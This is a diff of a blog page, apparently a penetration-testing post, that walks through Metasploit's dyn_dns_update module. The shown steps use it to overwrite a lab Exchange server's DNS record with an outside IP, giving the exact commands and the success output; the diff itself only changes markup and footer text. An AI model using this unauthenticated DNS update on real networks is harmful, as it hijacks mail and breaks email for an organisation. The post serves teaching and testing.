@@ -134,12 +134,12 @@ You can read up on the pull request in pr/#8599"/>
 <center> **You will break email for the entire company if you do this on a live network. Doing so is possibly a resume generating event.**</center>
 <center>![](/images/2017/before_dns_update.png)</center>
 <p>If you are going to be overwriting an existing record make sure to keep a note of the real IP address of the host you are overwriting so that you can fix the record afterwards.</p>
-<pre><code>$ dig @192.168.80.10 sdexchange.sittingduck.info
+<pre tabindex="0"><code>$ dig @192.168.80.10 sdexchange.sittingduck.info
 
 ;; ANSWER SECTION:
 sdexchange.sittingduck.info. 1200 IN	A	192.168.80.13
 </code></pre><p>Here is what the module looks like:</p>
-<pre><code>msf &gt; use auxiliary/admin/dns/dyn_dns_update
+<pre tabindex="0"><code>msf &gt; use auxiliary/admin/dns/dyn_dns_update
 msf auxiliary(dyn_dns_update) &gt; show options
 
 Module options (auxiliary/admin/dns/dyn_dns_update):
@@ -161,7 +161,7 @@ Auxiliary action:
    ----    -----------
    UPDATE  Add or update a record. (default)
 </code></pre><p>It has 3 different actions, but you&rsquo;ll mostly want <code>UPDATE</code>. <code>UPDATE</code> will automatically delete a record if it exists already and then add the record back with your specified settings.</p>
-<pre><code>msf auxiliary(dyn_dns_update) &gt; show actions
+<pre tabindex="0"><code>msf auxiliary(dyn_dns_update) &gt; show actions
 
 Auxiliary actions:
 
@@ -170,9 +170,8 @@ Auxiliary actions:
    ADD     Add a new record. Fail if it already exists.
    DELETE  Delete an existing record.
    UPDATE  Add or update a record. (default)
-
 </code></pre><p>Here are the settings I chose. Notice the IP address that I&rsquo;m injecting isn&rsquo;t on the same subnet as the domain.</p>
-<pre><code>msf auxiliary(dyn_dns_update) &gt; set DOMAIN sittingduck.info
+<pre tabindex="0"><code>msf auxiliary(dyn_dns_update) &gt; set DOMAIN sittingduck.info
 DOMAIN =&gt; sittingduck.info
 msf auxiliary(dyn_dns_update) &gt; set HOSTNAME sdexchange
 HOSTNAME =&gt; sdexchange
@@ -181,13 +180,13 @@ IP =&gt; 100.100.100.100
 msf auxiliary(dyn_dns_update) &gt; set RHOST 192.168.80.10
 RHOST =&gt; 192.168.80.10
 </code></pre><p>And the output:</p>
-<pre><code>msf auxiliary(dyn_dns_update) &gt; run
+<pre tabindex="0"><code>msf auxiliary(dyn_dns_update) &gt; run
 
 [+] Found existing A record for sdexchange.sittingduck.info
 [*] Sending dynamic DNS delete message...
-[+] The record 'sdexchange.sittingduck.info =&gt; 100.100.100.100' has been deleted!
+[+] The record &#39;sdexchange.sittingduck.info =&gt; 100.100.100.100&#39; has been deleted!
 [*] Sending dynamic DNS add message...
-[+] The record 'sdexchange.sittingduck.info =&gt; 100.100.100.100' has been added!
+[+] The record &#39;sdexchange.sittingduck.info =&gt; 100.100.100.100&#39; has been added!
 [*] Auxiliary module execution completed
 msf auxiliary(dyn_dns_update) &gt;
 </code></pre><h2 id="game-over">#Game Over</h2>
@@ -220,7 +219,7 @@ msf auxiliary(dyn_dns_update) &gt;
                 <footer class="footer">
     <div class="footer__inner">
         <div class="footer__content">
-            <span>&copy; 2021</span>
+            <span>&copy; 2023</span>
             
             <span><a href="https://malicious.link/post/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
         </div>
@@ -228,7 +227,7 @@ msf auxiliary(dyn_dns_update) &gt;
     <div class="footer__inner">
         <div class="footer__content">
             <span>Powered by <a href="http://gohugo.io">Hugo</a></span>
-            <span>Made with &#10084; by <a href="https://github.com/rhazdon">Djordje Atlialp</a></span>
+            <span>Made with &#10084; by <a href="https://github.com/mubix">mubix</a> - Theme by <a href="https://github.com/rhazdon/">Djordje Atlialp</a></span>
           </div>
     </div>
 </footer>
@@ -241,7 +240,7 @@ msf auxiliary(dyn_dns_update) &gt;
 
 
 
-<script type="text/javascript" src="/bundle.min.a0f363fdf81cdc5cfacc447a79c33189eb000d090336cd04aac8ee256f423b3133b836c281944c19c75e38d0b0b449f01ce5807e37798b7ac94ac1db51983fc4.js" integrity="sha512-oPNj/fgc3Fz6zER6ecMxiesADQkDNs0EqsjuJW9COzEzuDbCgZRMGcdeONCwtEnwHOWAfjd5i3rJSsHbUZg/xA=="></script>
+<script type="text/javascript" src="/bundle.min.8cc3758efe48ef82e2eb9a5f317b44c0805353a43762207be6fe8ffb05815cce7a19d37f6bf387c378a3bdfc3029981668d645374a33db4ee3480e15a4bfdc7c.js" integrity="sha512-jMN1jv5I74Li65pfMXtEwIBTU6Q3YiB75v6P&#43;wWBXM56GdN/a/OHw3ijvfwwKZgWaNZFN0oz207jSA4VpL/cfA=="></script>
 
 
 
